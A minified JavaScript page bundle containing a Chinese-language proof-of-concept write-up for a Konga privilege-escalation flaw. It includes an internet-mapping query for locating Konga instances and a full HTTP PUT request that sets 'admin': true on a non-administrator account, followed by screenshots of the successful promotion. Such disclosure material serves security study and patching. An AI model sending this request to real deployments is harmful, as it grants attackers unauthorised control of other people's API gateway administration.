(window.webpackJsonp=window.webpackJsonp||[]).push([[152],{2321:function(a,s,t){a.exports=t.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131947280.69861556.png"},2322:function(a,s,t){a.exports=t.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131947390.e7ab3969.png"},2323:function(a,s,t){a.exports=t.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131947376.a8d4d30e.png"},2324:function(a,s,t){a.exports=t.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131947324.766196d3.png"},3424:function(a,s,t){"use strict";t.r(s);var n=t(68),e=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"konga-普通用户越权获取管理员权限漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#konga-普通用户越权获取管理员权限漏洞"}},[a._v("#")]),a._v(" Konga 普通用户越权获取管理员权限漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("Konga 普通用户通过发送特殊的请求可越权获取管理员权限")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("Konga")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v('"konga"')]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("登录页面")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2321),alt:"img"}})]),a._v(" "),s("p",[a._v("创建非管理员用户后登录并获取token")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2322),alt:"img"}})]),a._v(" "),s("p",[a._v("发送请求包, 将token修改为刚刚获取的")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v('PUT /api/user/7 HTTP/1.1\nHost: 127.0.0.1:1337\nAccept: application/json, text/plain, */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/json;charset=utf-8\nContent-Length: 241\n\n{\n  "admin": true,\n  "passports": {\n    "password": "1234abcd",\n    "protocol": "local"\n  },\n  "password_confirmation": "1234abcd",\n  "token": "non-administrator user token"\n}\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br"),s("span",{staticClass:"line-number"},[a._v("16")]),s("br"),s("span",{staticClass:"line-number"},[a._v("17")]),s("br"),s("span",{staticClass:"line-number"},[a._v("18")]),s("br")])]),s("p",[s("img",{attrs:{src:t(2323),alt:"img"}})]),a._v(" "),s("p",[a._v("成功转为管理员用户")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2324),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);